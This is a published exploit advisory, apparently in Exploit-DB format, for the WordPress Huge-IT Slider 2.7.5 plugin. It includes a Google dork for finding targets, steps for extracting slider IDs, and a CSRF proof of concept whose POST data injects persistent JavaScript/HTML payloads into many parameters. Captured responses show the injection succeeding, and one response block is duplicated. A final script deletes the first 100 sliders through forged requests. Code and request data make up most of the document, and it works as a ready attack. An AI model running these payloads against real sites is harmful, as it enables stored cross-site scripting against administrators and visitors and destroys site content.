@@ -1,0 +1,278 @@
+# Exploit Title: WordPress: wordpress huge-it-slider 2.7.5 & Persistent JS-HTML Code injection, Arbitrary slider deletion
+# Date: 2015-06-23
+# Google Dork: intitle:"index of" intext:"/wp-content/plugins/slider-image/"
+# Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
+# Software Link: https://downloads.wordpress.org/plugin/slider-image.latest-stable.zip
+# Version: 2.7.5 
+# Tested on: windows 7 ultimate + Firefox.
+# video demo: https://www.youtube.com/watch?v=RTLAbmyBIU8
+
+====================================================
+    * CSRF + Persistent JS/HTML Injection 
+====================================================
+
+=====================
+DECRIPTION
+=====================
+
+An attacker can make a user with access privileges to a page containing malicious script
+and send some parameters injected JavaScript to the database.
+
+============================
+vulnerable POST parameters
+============================
+//variables with variation names//
+
+order_by_[variation_number]
+titleimage[variation_number]
+sl_url[variation_number]
+sl_link_target[variation_number]
+im_description[variation_number]
+imagess[variation_number]
+
+//variables with constant names//
+
+sl_pausetime
+sl_changespeed
+
+===============
+EXPLOTATION
+===============
+
+variable numbers can be extracted from a published page containing the slider. and make all
+parameters injected with code JS / HTML.
+
+-------------------
+EXAMPLE
+-------------------
+[Extracting data for use]
+
+In a vulnerable site and has posted a slider, the malicious user can extract information
+the attack is successful.
+
+-----------------------------------------------------------------------------------------
+[variation_number] is a variable number that could be extracted as follows.
+-----------------------------------------------------------------------------------------
+The attacker sees the following framento source code of the page with slider:
+
+<!-- ##########################DOTS######################### -->
+
+   <div class="huge_it_slideshow_dots_container_2"> [ <---SLIDER_ID_FOUND=2 ]
+  <div class="huge_it_slideshow_dots_thumbnails_2">
+        <div id="huge_it_dots_0_1" class="huge_it_slideshow_dots_1 huge_it_slideshow_dots_active_1" 
+onclick="huge_it_change_image_1(parseInt(jQuery('#huge_it_current_image_key_1').val()), '0', data_1,false,true);
+return false;" 
+
+image_id="14" [ <---ITS_VARIATION_NUMBER!!!  ]
+
+image_key="0"></div>
+          </div>
+    <a id="huge_it_slideshow_left_1" href="#" >
+<div id="huge_it_slideshow_left-ico_1">
+<div><i class="huge_it_slideshow_prev_btn_1 fa"></i></div></div>
+        </a>
+    <a id="huge_it_slideshow_right_1" href="#" >
+        <div id="huge_it_slideshow_right-ico_1 , data_1">
+        <div><i class="huge_it_slideshow_next_btn_1 fa"></i></div></div>
+    </a>
+        </div>
+<!-- ##########################IMAGES######################### -->
+
+
+-----------------------------------------------------------------------------------
+Classes tags [<div>] have a number at the end that is the id of the slider.
+Also labeled [<div id = "huge_it_dots_ ...>] has the property [image_id] which is the
+POST variable number of vulnerable parameters.
+
+============================================
+POC [DATA RELATING TO THE ABOVE]
+============================================
+------------                                                            SLIDER_ID
+URL REQUEST                                                                  |                                      
+------------
+http://localhost/wordpress/wp-admin/admin.php?page=sliders_huge_it_slider&id=2&task=apply
+--------
+POSTDATA
+--------
+name=i0akiN-SEC&order_by_14=%22+onmouseover%3Dalert%28%2Fi0akiN_hack%2F%29+a%3D%22&imagess14=&
+titleimage14=%22+onmouseover%3Dalert%28%2Fi0akiN_hack%2F%29+a%3D%22&
+sl_url14=%22+onmouseover%3Dalert%28%2Fi0akiN_hack%2F%29+a%3D%22&sl_link_target14=&
+sl_pausetime=%22+onmouseover%3Dalert%28%2Fi0akiN_hack%2F%29+a%3D%22&
+sl_changespeed=%22+onmouseover%3Dalert%28%2Fi0akiN_hack%2F%29+a%3D%22&
+im_description14=as%3C%2Ftextarea%3E%3Cscript%3Ealert%28%2Fi0akiN_HACK%2F%29%3B%3C%2Fscript%3E&
+imagess14=%22+onmouseover%3Dalert%28%2Fi0akiN_hack%2F%29+a%3D%22&sl_width=500&
+sl_height=300&pause_on_hover=off&slider_effects_list=cubeH&sl_position=center&task=
+
+--------------------
+RESPONSE ADMIN PAGE
+--------------------
+
+...
+
+<input class="order_by" type="hidden" name="order_by_14" value="0" />
+<div class="image-container">
+    <img src="" onmouseover=alert(/i0akiN_hack/) a="" />
+    <div>
+        <script>
+            ...        </script>
+        <input type="hidden" name="imagess14" id="_unique_name14" value="" onmouseover=alert(/i0akiN_hack/) a="" />
+        <span class="wp-media-buttons-icon"></span>
+        <div class="huge-it-editnewuploader uploader button14 add-new-image">
+            <input type="button" class="button14 wp-media-buttons-icon editimageicon" name="_unique_name_button14" id="_unique_name_button14" value="Edit image" />
+        </div>
+    </div>
+</div>
+<div class="image-options">
+    <div>
+        <label for="titleimage14">Title:</label>
+        <input  class="text_area" type="text" id="titleimage14" name="titleimage14" id="titleimage14"  value="" onmouseover=alert(/i0akiN_hack/) a="">
+    </div>
+    <div class="description-block">
+        <label for="im_description14">Description:</label>
+        <textarea id="im_description14" name="im_description14" >as&lt;/textarea&gt;<script>alert(/i0akiN_HACK/);</script>&lt;/textarea&gt;
+    </div>
+    <div class="link-block">
+        <label for="sl_url14">URL:</label>
+        <input class="text_area url-input" type="text" id="sl_url14" name="sl_url14"  value="" onmouseover=alert(/i0akiN_hack/) a="" >
+        <label class="long" for="sl_link_target14">Open in new tab</label>
+        <input type="hidden" name="sl_link_target14" value="" />
+        <input    class="link_target" type="checkbox" id="sl_link_target14" name="sl_link_target14" />
+    </div>
+    <div class="remove-image-container">
+        <a class="button remove-image" href="admin.php?page=sliders_huge_it_slider&id=2&task=apply&removeslide=14">Remove Image</a>
+    </div>
+</div>
+
+<div class="clear"></div>
+</li>
+</ul>
+</div>
+</div>
+<div id="postbox-container-1" class="postbox-container">
+    <div id="side-sortables" class="meta-box-sortables ui-sortable">
+        <div id="slider-unique-options" class="postbox">
+            ...
+            <li>
+                <label for="sl_pausetime">Pause time</label>
+                <input type="text" name="sl_pausetime" id="sl_pausetime" value="" onmouseover=alert(/i0akiN_hack/) a="" class="text_area" />
+            </li>
+            <li>
+                <label for="sl_changespeed">Change speed</label>
+                <input type="text" name="sl_changespeed" id="sl_changespeed" value="" onmouseover=alert(/i0akiN_hack/) a="" class="text_area" />
+            </li>
+
+            ...
+
+-----------------------------------------
+RESPONSE PUBLISHED PAGE WITH IMAGE SLIDER
+-----------------------------------------
+
+...
+
+<script>
+    var data_2 = [];
+    var event_stack_2 = [];
+    video_is_playing_2 = false;
+    data_2["0"] = []; data_2["0"]["id"] = "0"; data_2["0"]["image_url"] = "" onmouseover = alert(/i0akiN_hack/) a = ""; data_2["0"]["description"] = "as&lt;/textarea&gt;
+<script>alert(/i0akiN_HACK/);</script>";data_2["0"]["alt"]="' onmouseover=alert(/i0akiN_hack/) a='";    
+
+===<!-- SUCCESFULL INJECTION :) -->===
+
+var huge_it_trans_in_progress_2 = false;
+var huge_it_transition_duration_2 = " onmouseover=alert(/i0akiN_hack/) a=";
+var huge_it_playInterval_2;
+// Stop autoplay.
+window.clearInterval(huge_it_playInterval_2);
+....
+
+<!-- ##########################IMAGES######################### -->
+<div id="huge_it_slideshow_image_container_2" class="huge_it_slideshow_image_container_2">        
+    <div class="huge_it_slide_container_2">
+        <div class="huge_it_slide_bg_2">
+            <ul class="huge_it_slider_2">
+                <li class="huge_it_slideshow_image_item_2" id="image_id_2_0">      
+<a href="" onmouseover=alert(/i0akiN_hack/) a="" ><img id="huge_it_slideshow_image_2" class="huge_it_slideshow_image_2" 
+src="" onmouseover=alert(/i0akiN_hack/) a="" image_id="14" />
+                    </a>        
+                    <div class="huge_it_slideshow_title_text_2 ">         " onmouseover=alert(/i0akiN_hack/) a="</div>
+                    <div class="huge_it_slideshow_description_text_2 ">as&lt;/textarea&gt;<script>alert(/i0akiN_HACK/);</script>                        </div>
+                </li>
+                <input  type="hidden" id="huge_it_current_image_key_2" value="0" />
+            </ul>
+        </div>
+    </div>
+</div>
+
+...
+
+
+
+-----------------------------------------
+RESPONSE PUBLISHED PAGE WITH IMAGE SLIDER
+-----------------------------------------
+
+...
+
+<script>
+    var data_2 = [];
+    var event_stack_2 = [];
+    video_is_playing_2 = false;
+    data_2["0"] = []; data_2["0"]["id"] = "0"; data_2["0"]["image_url"] = "" onmouseover = alert(/i0akiN_hack/) a = ""; data_2["0"]["description"] = "as&lt;/textarea&gt;
+<script>alert(/i0akiN_HACK/);</script>";data_2["0"]["alt"]="' onmouseover=alert(/i0akiN_hack/) a='";    
+
+===<!-- SUCCESFULL INJECTION :) -->===
+
+var huge_it_trans_in_progress_2 = false;
+var huge_it_transition_duration_2 = " onmouseover=alert(/i0akiN_hack/) a=";
+var huge_it_playInterval_2;
+// Stop autoplay.
+window.clearInterval(huge_it_playInterval_2);
+....
+
+<!-- ##########################IMAGES######################### -->
+<div id="huge_it_slideshow_image_container_2" class="huge_it_slideshow_image_container_2">        
+    <div class="huge_it_slide_container_2">
+        <div class="huge_it_slide_bg_2">
+            <ul class="huge_it_slider_2">
+                <li class="huge_it_slideshow_image_item_2" id="image_id_2_0">      
+<a href="" onmouseover=alert(/i0akiN_hack/) a="" ><img id="huge_it_slideshow_image_2" class="huge_it_slideshow_image_2" 
+src="" onmouseover=alert(/i0akiN_hack/) a="" image_id="14" />
+                    </a>        
+                    <div class="huge_it_slideshow_title_text_2 ">         " onmouseover=alert(/i0akiN_hack/) a="</div>
+                    <div class="huge_it_slideshow_description_text_2 ">as&lt;/textarea&gt;<script>alert(/i0akiN_HACK/);</script>                        </div>
+                </li>
+                <input  type="hidden" id="huge_it_current_image_key_2" value="0" />
+            </ul>
+        </div>
+    </div>
+</div>
+
+...
+
+
+====================================
+ * CSRF & ARBITRARY SLIDER DELETION
+====================================
+
+=====================
+ POC
+=====================
+
+//delete first 100 sliders
+
+<script> 
+
+function sendData( id_slider ){ 
+   var req=new XMLHttpRequest();
+   req.open("GET","http://localhost/wordpress/wp-admin/admin.php?page=sliders_huge_it_slider&task=remove_cat&id="+id_slider,true);
+   req.withCredentials="true";
+   req.send();      
+}
+
+for(var i=0;i<100;i++){
+     sendData( i );
+}
+
+</script>
+
+token authentication not found!
